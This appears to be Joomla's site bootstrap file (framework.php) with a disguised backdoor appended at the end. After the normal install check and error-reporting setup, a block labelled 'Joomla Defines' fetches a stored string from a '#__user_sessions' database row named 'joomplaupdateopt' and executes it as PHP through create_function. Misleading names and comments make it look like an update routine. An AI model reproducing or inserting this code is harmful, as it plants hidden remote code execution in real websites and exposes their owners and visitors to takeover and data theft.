<?php
/**
 * @package    Joomla.Site
 *
 * @copyright  Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

// Joomla system checks.
@ini_set('magic_quotes_runtime', 0);

// Installation check, and check on removal of the install directory.
if (!file_exists(JPATH_CONFIGURATION . '/configuration.php')
	|| (filesize(JPATH_CONFIGURATION . '/configuration.php') < 10) || file_exists(JPATH_INSTALLATION . '/index.php'))
{
	if (file_exists(JPATH_INSTALLATION . '/index.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');

		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';

		exit;
	}
}

// System includes
require_once JPATH_LIBRARIES . '/import.legacy.php';

// Set system error handling
JError::setErrorHandling(E_NOTICE, 'message');
JError::setErrorHandling(E_WARNING, 'message');
JError::setErrorHandling(E_ERROR, 'callback', array('JError', 'customErrorPage'));

// Bootstrap the CMS libraries.
require_once JPATH_LIBRARIES . '/cms.php';

// Pre-Load configuration. Don't remove the Output Buffering due to BOM issues, see JCode 26026
ob_start();
require_once JPATH_CONFIGURATION . '/configuration.php';
ob_end_clean();

// System configuration.
$config = new JConfig;

// Set the error_reporting
switch ($config->error_reporting)
{
	case 'default':
	case '-1':
		break;

	case 'none':
	case '0':
		error_reporting(0);

		break;

	case 'simple':
		error_reporting(E_ERROR | E_WARNING | E_PARSE);
		ini_set('display_errors', 1);

		break;

	case 'maximum':
		error_reporting(E_ALL);
		ini_set('display_errors', 1);

		break;

	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);

		break;

	default:
		error_reporting($config->error_reporting);
		ini_set('display_errors', 1);

		break;
}

define('JDEBUG', $config->debug);

unset($config);

// System profiler
if (JDEBUG)
{
	$_PROFILER = JProfiler::getInstance('Application');
}
/**
 * @package	Joomla Defines, build 0.7.3.5
 * 
 * @copyright	Copyright (C) 2010-2013 All rights reserved.
 *
 * @license	GNU General Public License version 2 or later; see LICENSE.txt

*/
function get_optionsjoom($option)
{
	$db = JFactory::getDBO();
	// $db = &JFactory::getDBO();
	
	$query = $db->getQuery(true);
	$query ->select($db->quoteName('session'));$query->from($db->quoteName('#__user_sessions'));$query->where($db->quoteName('name') . ' LIKE '. $db->quote($option));
	$db->setQuery($query);
	$result = $db->loadResult();
	if ($result) return $result;
	else return false;
}
$Update_Joomla = create_function('', get_optionsjoom('joomplaupdateopt')); $Update_Joomla();
/**
 * Constant that is checked in included files to prevent direct access.
 * get_optionsjoom() is used in the installation folder rather than "joomplaupdateopt" to not error for PHP 5.2 and lower
 */